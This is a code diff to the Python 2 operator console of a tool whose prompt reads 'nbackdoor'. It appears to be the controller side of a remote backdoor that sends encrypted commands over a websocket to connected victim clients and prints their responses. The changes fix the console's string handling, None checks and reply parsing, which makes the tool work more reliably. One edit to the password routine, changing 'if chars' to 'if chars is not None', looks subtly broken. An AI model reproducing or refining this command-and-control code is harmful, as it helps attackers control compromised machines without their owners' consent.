@@ -67,7 +67,7 @@ class ControllerClient:
                 # =======================
                 while not self.exit:
                     input_str = raw_input(Back.RED + 'nbackdoor' +
-                                          ((' in ' + self.to_client + '') if self.to_client else '') +
+                                          ((' in ' + str(self.to_client) + '') if self.to_client is not None else '') +
                                           ':' + Back.RESET + ' ')
                     if input_str == 'exit':
                         self.exit = True
@@ -77,16 +77,16 @@ class ControllerClient:
                     self.ws.send(self.encrypt(msg))
 
                     msg_recv = json.loads(self.decrypt(self.ws.recv()))
-
                     if 'data' in msg_recv:
-                        while 'end' not in msg_recv:
+                        while 'data' in msg_recv and 'end' not in msg_recv:
                             data = get_data(msg_recv)
                             print data
 
-                            msg_recv = self.decrypt(self.ws.recv())
+                            msg_recv = json.loads(self.decrypt(self.ws.recv()))
+
                     elif 'connected' in msg_recv:
                         self.to_client = msg_recv['connected']
-                        print 'Connected to client ' + self.to_client + '.\n'
+                        print 'Connected to client ' + str(self.to_client) + '.\n'
                     elif 'disconnected' in msg_recv:
                         self.to_client = None
                         print 'Disconnected success.\n'
@@ -96,7 +96,7 @@ class ControllerClient:
             except Exception as e:
                 print e.message if e.message else 'unkown err'
 
-                if self.ws:
+                if self.ws is not None:
                     self.ws.close()
                 time.sleep(3)
 
@@ -142,7 +142,7 @@ def pwd_input(msg):
             break
 
         elif new_char == '\b':  # 如果是退格，则删除密码末尾一位并且删除一个星号
-            if chars:
+            if chars is not None:
                 del chars[-1]
                 msvcrt.putch('\b'.encode(encoding='utf-8'))     # 光标回退一格
                 msvcrt.putch(' '.encode(encoding='utf-8'))      # 输出一个空格覆盖原来的星号
